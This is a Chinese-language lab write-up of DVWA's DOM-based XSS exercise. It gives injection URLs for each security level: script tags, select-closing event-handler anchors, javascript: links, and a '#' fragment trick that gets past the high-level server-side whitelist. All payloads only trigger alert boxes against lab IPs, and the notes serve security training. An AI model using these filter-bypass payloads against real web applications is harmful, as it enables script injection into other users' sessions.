---
title: DVWA-XSS‘DOM型’手记
date: 2018-10-10 21:29:38
tags: [DVWA,XSS]
categories: XSS
---

# DVWA-XSS‘DOM型’手记

------

可能触发DOM型XSS的属性：

```
document.referer属性
 
window.name属性
 
location属性
 
innerHTML属性
 
documen.write属性
```



## LOW

### Source:

![001](/img/xss/dvwa/Dom/low_001.png)

### Analysis:	

```
没有进行任何过滤,利用F12开发者模式寻找到DOM位置。找到name属性为default,通过在url中的default参数来修改页面。
```

![002](/img/xss/dvwa/Dom/low_002.png)

这里可以直接弹窗。

```
1.http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

![003](/img/xss/dvwa/Dom/low_003.png)

可以发现结构已经被破坏了。

![004](/img/xss/dvwa/Dom/low_004.png)

同样可以构造闭合将页面破坏成想要的样子。

2.`http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name="fuck">`

### Process:

![005](/img/xss/dvwa/Dom/low_005.png)

![006](/img/xss/dvwa/Dom/low_006.png)

## MEDIUM

### Source:

![007](/img/xss/dvwa/Dom/medium_001.png)

### Analysis:	

```
查找是否存在<script,stripos能检验大小写的,发现恶意构造的就默认使用English。
既然这样就不使用<script即可。
```


    1. 使用事件
      `http://10.60.250.250/DVWA/vulnerabilities/xss_d/?default=</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name="fuck">`
    2. 使用javascript协议
     `http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=</select><a href="javascript:alert('javascript')">Clickme</a><select name="fuck">`

### Process:

1. 使用事件

![008](/img/xss/dvwa/Dom/medium_002.png)

2. 使用javascript协议

   ![009](/img/xss/dvwa/Dom/medium_003.png)

![010](/img/xss/dvwa/Dom/medium_004.png)

## HIGH

### Source:

![011](/img/xss/dvwa/Dom/high_001.png)

### Analysis:	

```
类似于白名单过滤,看似无懈可击,但是可以利用URL的一个特性。
URL的部分发往服务器时#号后面的并不会发送到服务器，但是javascript代码
还会正常读取，所以利用这个特性来绕过服务器端的检查。
```

1.`http://192.168.1.111/DVWA/vulnerabilities/xss_d/?default=#</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name="fuck">`

### Process:

![012](/img/xss/dvwa/Dom/high_002.png)

![013](/img/xss/dvwa/Dom/high_003.png)

## IMPOSSIBLE

### Source:

![014](/img/xss/dvwa/Dom/impossible_01.png)

提示已经用客户端侧进行保护了,无法再进行修改。